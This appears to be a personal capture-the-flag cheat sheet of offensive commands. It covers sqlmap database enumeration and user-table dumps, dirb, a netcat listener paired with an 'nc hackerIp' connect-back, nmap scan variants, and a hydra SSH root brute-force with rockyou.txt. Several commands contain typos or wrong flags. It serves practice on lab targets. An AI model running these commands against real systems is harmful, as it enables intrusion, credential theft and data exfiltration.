# ctf

sqlmap -u url --dbs


sqlmap - u url --dbs blog --tables


sqlmap -u url --dbs blog --tables users --columns

sqlmap -u url -D database -T table --dump


sqlmap -u url -D database --dump-all --batch


sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --dump-all -batch  -v 3



sqlmap -u url --dbs --batch


sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user


–data = POST data


sqlmap -r file.txt -p username


dirb url

netcat -lnvp 9191 


nc hackerIp 9191



https://resources.infosecinstitute.com/topic/important-sqlmap-commands/


Crowler:
sqlmap -u http://testphp.vulnweb.com/ -crawl=3


cp file newName ========= le nouveau local c'est ou tu est positionner 


https://www.kali.org/tools/webshells/



NMAP


nmap -sV -O 192.168.100.101  ---> service version  - operating sys


nmap -T4 -A -v 192.168.100.101   -->Intense scan


nmap -sS -sU -T4 -A -v    -->Intense scan plus UDP


nmap -T4 -A -v -Pn   --->Intense scan, no ping


nmap -sn    ---> Ping scan


nmap -T4 -F   -->quiq scan


nmap -sV -T4 -O -F --version-light   --> quiq scan plus


nmap -sn --traceroute -->quiq traceroute


nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)"   -->slow comprehensive scan



BRUTFORCE 


hydra -l root -p rockyou.txt -u  -s 22  192.168.160.181 ssh 


https://github.com/jeanphorn/wordlist/blob/master/usernames.txt


cryptography

https://gchq.github.io/CyberChef/


http://www.jsfuck.com/#
